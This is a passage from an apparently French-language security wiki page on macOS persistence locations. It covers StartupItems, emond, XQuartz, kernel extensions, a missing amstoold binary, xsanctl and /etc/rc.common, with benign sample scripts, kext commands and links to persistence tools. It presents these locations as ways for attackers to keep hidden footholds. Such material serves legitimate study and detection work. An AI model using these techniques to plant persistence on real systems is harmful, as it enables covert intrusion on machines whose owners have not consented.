{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Je ne peux pas trouver ce composant dans mon macOS, donc pour plus d'infos, consultez le writeup

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Introduit par Apple, **emond** est un mécanisme de journalisation qui semble être sous-développé ou peut-être abandonné, mais il reste accessible. Bien qu'il ne soit pas particulièrement bénéfique pour un administrateur Mac, ce service obscur pourrait servir de méthode de persistance subtile pour les acteurs de la menace, probablement inaperçu par la plupart des administrateurs macOS.

Pour ceux qui sont au courant de son existence, identifier toute utilisation malveillante de **emond** est simple. Le LaunchDaemon du système pour ce service recherche des scripts à exécuter dans un seul répertoire. Pour inspecter cela, la commande suivante peut être utilisée :
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Emplacement

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Root requis
- **Déclencheur**: Avec XQuartz

#### Description & Exploit

XQuartz **n'est plus installé sur macOS**, donc si vous voulez plus d'infos, consultez le writeup.

### ~~kext~~

> [!CAUTION]
> C'est tellement compliqué d'installer un kext même en tant que root que je ne considérerai pas cela pour échapper aux sandboxes ou même pour la persistance (à moins que vous ayez un exploit)

#### Emplacement

Pour installer un KEXT en tant qu'élément de démarrage, il doit être **installé dans l'un des emplacements suivants** :

- `/System/Library/Extensions`
- Fichiers KEXT intégrés dans le système d'exploitation OS X.
- `/Library/Extensions`
- Fichiers KEXT installés par des logiciels tiers

Vous pouvez lister les fichiers kext actuellement chargés avec :
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Pour plus d'informations sur [**les extensions du noyau, consultez cette section**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers).

### ~~amstoold~~

Écriture : [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Emplacement

- **`/usr/local/bin/amstoold`**
- Accès root requis

#### Description & Exploitation

Apparemment, le `plist` de `/System/Library/LaunchAgents/com.apple.amstoold.plist` utilisait ce binaire tout en exposant un service XPC... le problème est que le binaire n'existait pas, donc vous pouviez placer quelque chose là et lorsque le service XPC est appelé, votre binaire sera appelé.

Je ne peux plus trouver cela sur mon macOS.

### ~~xsanctl~~

Écriture : [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Emplacement

- **`/Library/Preferences/Xsan/.xsanrc`**
- Accès root requis
- **Déclencheur** : Lorsque le service est exécuté (rarement)

#### Description & exploitation

Apparemment, il n'est pas très courant d'exécuter ce script et je n'ai même pas pu le trouver sur mon macOS, donc si vous voulez plus d'infos, consultez l'écriture.

### ~~/etc/rc.common~~

> [!CAUTION] > **Cela ne fonctionne pas dans les versions modernes de MacOS**

Il est également possible de placer ici **des commandes qui seront exécutées au démarrage.** Exemple de script rc.common régulier :
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Techniques et outils de persistance

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

{{#include ../banners/hacktricks-training.md}}
